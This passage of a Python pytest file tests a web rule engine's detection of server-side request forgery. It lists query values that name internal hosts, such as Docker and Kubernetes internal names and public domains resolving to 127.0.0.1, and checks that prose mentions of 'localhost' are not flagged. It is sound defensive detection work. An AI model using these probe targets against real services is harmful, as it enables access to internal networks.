    "/get/test?url=ip6-loopback/",
    "/get/test?url=host.docker.internal/",
    "/get/test?url=gateway.docker.internal/",
    "/get/test?url=kubernetes.docker.internal/",
    "/get/test?url=host.containers.internal/",
    "/get/test?url=kubernetes.default.svc.cluster.local/",
    # Public names whose DNS resolves to 127.0.0.1 — the trick is that they
    # look external and are not.
    "/get/test?url=localtest.me/",
    "/get/test?url=lvh.me/",
]

#: The line this must not cross.
SSRF_NAME_BENIGN: list[str] = [
    # Certified harmless by the corpus: a public host, no scheme, same shape.
    "/get/test?url=example.com/",
    # The word in prose rather than as a destination. A shop that sells
    # developer tools has customers who search for this.
    "/search?q=how to run localhost",
    "/search?q=localhost tutorial",
    "/get?note=see localhost docs",
]


@pytest.mark.parametrize("target", SSRF_INTERNAL_NAMES)
def test_an_internal_host_named_without_a_scheme_is_caught(engine: RuleEngine, target: str) -> None:
    """A parameter whose value *is* one of these names is a fetch instruction
    pointing back inside, whether or not somebody wrote `http://` in front."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert hostile, f"nothing called {target!r} hostile"


@pytest.mark.parametrize("target", SSRF_NAME_BENIGN)
def test_the_word_localhost_in_prose_is_not_an_address(engine: RuleEngine, target: str) -> None:
    """**The value has to *be* the host, not merely contain the word.** A rule
    matching `localhost` anywhere would take every search a developer-tools shop
    receives, which is the same mistake `attack/windows.yaml` exists to avoid
    with `for` and `time`."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert not hostile, f"{target!r} was called hostile by {hostile}"
